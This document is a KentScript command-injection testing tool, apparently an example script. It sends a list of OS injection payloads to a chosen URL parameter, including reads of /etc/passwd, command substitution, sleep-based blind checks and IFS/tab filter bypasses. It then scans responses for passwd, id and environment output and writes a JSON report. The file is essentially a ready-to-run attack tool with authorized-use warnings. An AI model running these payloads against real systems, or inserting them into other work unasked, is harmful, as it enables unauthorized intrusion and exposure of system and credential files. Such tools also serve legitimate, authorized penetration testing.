:: Command Injection Tester - Test for command injection vulnerabilities
:: Usage: python3 main.py run examples/cmd_injection_tester.ks --url <url> [--param <param>]

import argparse;
import http;
import json;

let parser = system_argparse_new("KentScript Command Injection Tester v1.0");
system_argparse_add_argument(parser, "--url");
system_argparse_add_argument(parser, "--param");
system_argparse_add_argument(parser, "--method");
system_argparse_add_argument(parser, "--data");

let args = system_argparse_parse_args(parser, []);

if args.url == none {
    print("Usage: cmd_injection_tester.ks --url <url> [--param <param>] [--method GET|POST]");
    print("");
    print("This tool tests for OS command injection vulnerabilities.");
    print("Use responsibly and only on systems you have permission to test.");
    print("");
    print("Examples:");
    print("  cmd_injection_tester.ks --url \"http://target.com/ping?ip=127.0.0.1\" --param ip");
    print("  cmd_injection_tester.ks --url \"http://target.com/ping\" --param ip --method POST");
    system_os_exit(1);
}

let target_url = str(args.url);
let param = "cmd";
if args.param != none {
    param = str(args.param);
}

let method = "GET";
if args.method != none {
    method = str(args.method).upper();
}

print(f"[*] KentScript Command Injection Tester v1.0");
print(f"[*] Target: {target_url}");
print(f"[*] Parameter: {param}");
print(f"[*] Method: {method}");
print("");

:: Get confirmation
print("[!] WARNING: This tool is for authorized testing only!");
print("[!] Unauthorized access to computer systems is illegal.");
print("");

:: Payloads to test
let payloads = [
    {"payload": "; whoami", "type": "separator", "name": "semicolon"},
    {"payload": "| whoami", "type": "separator", "name": "pipe"},
    {"payload": "& whoami", "type": "separator", "name": "background"},
    {"payload": "&& whoami", "type": "separator", "name": "and"},
    {"payload": "|| whoami", "type": "separator", "name": "or"},
    {"payload": "; ls -la", "type": "separator", "name": "semicolon_ls"},
    {"payload": "| cat /etc/passwd", "type": "file", "name": "passwd_pipe"},
    {"payload": "; cat /etc/passwd", "type": "file", "name": "passwd_semi"},
    {"payload": "%0awhoami", "type": "newline", "name": "newline_url"},
    {"payload": "\nwhoami", "type": "newline", "name": "newline_raw"},
    {"payload": "$(whoami)", "type": "substitution", "name": "dollar_sub"},
    {"payload": "`whoami`", "type": "substitution", "name": "backtick_sub"},
    {"payload": "$(cat /etc/passwd)", "type": "substitution", "name": "passwd_dollar"},
    {"payload": "; sleep 5", "type": "blind", "name": "sleep"},
    {"payload": "| sleep 5", "type": "blind", "name": "sleep_pipe"},
    {"payload": "& sleep 5 &", "type": "blind", "name": "sleep_bg"},
    {"payload": "; ping -c 3 127.0.0.1", "type": "network", "name": "ping"},
    {"payload": "; curl http://127.0.0.1", "type": "network", "name": "curl"},
    {"payload": "; wget http://127.0.0.1", "type": "network", "name": "wget"},
    {"payload": "; ls /", "type": "file", "name": "ls_root"},
    {"payload": "; ls /tmp", "type": "file", "name": "ls_tmp"},
    {"payload": "; cat /etc/hostname", "type": "file", "name": "hostname"},
    {"payload": "; env", "type": "env", "name": "env"},
    {"payload": "; id", "type": "env", "name": "id"},
    {"payload": "; uname -a", "type": "env", "name": "uname"},
    {"payload": ";whoami", "type": "bypass", "name": "no_space"},
    {"payload": "; cat${IFS}/etc/passwd", "type": "bypass", "name": "ifs_bypass"},
    {"payload": "; cat%09/etc/passwd", "type": "bypass", "name": "tab_bypass"}
];

print(f"[*] Loaded {len(payloads)} test payloads");
print("");
print("=== Testing for Command Injection ===");
print("");

let vulnerabilities = [];
let tested = 0;
let errors = 0;

for test_case in payloads {
    tested = tested + 1;
    let payload = test_case["payload"];
    let test_name = test_case["name"];
    
    :: Build test URL
    let test_url = target_url;
    let response_text = "";
    let response_time = 0;
    
    let start_time = time.time();
    
    try {
        if method == "GET" {
            :: Append payload to URL
            if test_url.find("?") >= 0 {
                test_url = test_url + "&" + param + "=" + payload;
            } else {
                test_url = test_url + "?" + param + "=" + payload;
            }
            
            let resp = http.get(test_url, timeout=10);
            if resp != none {
                response_text = resp.text;
            }
        } else {
            :: POST request
            let data = {};
            data[param] = payload;
            let resp = http.post(target_url, json.dumps(data), timeout=10);
            if resp != none {
                response_text = resp.text;
            }
        }
        
        response_time = time.time() - start_time;
        
    } except e {
        errors = errors + 1;
        continue;
    }
    
    :: Analyze response
    let indicators = [
        {"pattern": "root:", "info": "Found /etc/passwd content"},
        {"pattern": "uid=", "info": "Found user ID (id command output)"},
        {"pattern": "/bin/bash", "info": "Found bash shell"},
        {"pattern": "/bin/sh", "info": "Found shell"},
        {"pattern": "Linux", "info": "Found system info (uname)"},
        {"pattern": "HOME=/", "info": "Found environment variable"},
        {"pattern": "PWD=", "info": "Found working directory"}
    ];
    
    let found_indicators = [];
    
    for indicator in indicators {
        if response_text.lower().find(indicator["pattern"].lower()) >= 0 {
            found_indicators.append(indicator["info"]);
        }
    }
    
    :: Check for time-based injection
    if test_case["type"] == "blind" and response_time >= 4 {
        found_indicators.append(f"Time delay detected ({response_time}s)");
    }
    
    :: Check for errors that might indicate injection
    if response_text.find("uid=") >= 0 or response_text.find("root:") >= 0 {
        let vuln = {
            "payload": payload,
            "type": test_case["type"],
            "indicators": found_indicators,
            "response_preview": str(response_text).substr(0, 200)
        };
        vulnerabilities.append(vuln);
        print(f"[!] VULNERABLE: {test_name}");
        print(f"    Payload: {payload}");
        for ind in found_indicators {
            print(f"    [+] {ind}");
        }
        print("");
    } elif len(found_indicators) > 0 {
        print(f"[?] Possible: {test_name}");
        print(f"    Payload: {payload}");
        for ind in found_indicators {
            print(f"    [?] {ind}");
        }
        print("");
    }
    
    if tested % 5 == 0 {
        print(f"[*] Progress: {tested}/{len(payloads)} tested");
    }
}

print("");
print("=== Test Complete ===");
print(f"[*] Tested: {tested} payloads");
print(f"[*] Errors: {errors}");
print(f"[*] Vulnerabilities: {len(vulnerabilities)}");
print("");

if len(vulnerabilities) > 0 {
    print("[!] COMMAND INJECTION VULNERABILITIES FOUND!");
    
    let report = {
        "target": target_url,
        "parameter": param,
        "method": method,
        "timestamp": system_time_format(system_time_now(), "%Y-%m-%d %H:%M:%S"),
        "vulnerabilities": vulnerabilities
    };
    
    let report_file = "cmd_injection_report_" + system_time_format(system_time_now(), "%Y%m%d_%H%M%S") + ".json";
    system_file_write_text(report_file, json.dumps(report, pretty=true));
    print(f"[*] Report saved to: {report_file}");
}
